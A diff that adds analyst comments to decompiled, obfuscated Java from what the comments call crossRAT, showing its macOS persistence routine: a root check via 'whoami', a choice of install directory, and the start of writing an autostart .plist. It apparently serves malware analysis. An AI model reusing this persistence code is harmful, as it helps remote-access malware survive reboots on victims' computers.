@@ -6,11 +6,13 @@ import java.io.FileWriter;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
 
+// OSX persistence.
 public final class c extends a {
    public c(String var1, String var2, boolean var3) {
       super(var1, var2, var3);
    }
 
+   // Figure out where to install. If root, install at /Library/..., otherwise at user home dir.
    private static File b() {
       String var0 = System.getProperty("user.home");
       if (a.c.b().a() != a.c.a && (new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("whoami").getInputStream()))).readLine().equals("root")) {
@@ -25,6 +27,7 @@ public final class c extends a {
          b().mkdirs();
       }
 
+      // Create the .plist file to autostart crossRAT.
       File var1 = new File(b(), super.b + ".plist");
       PrintWriter var2;
       (var2 = new PrintWriter(new FileWriter(var1))).println("<plist version=\"1.0\">");
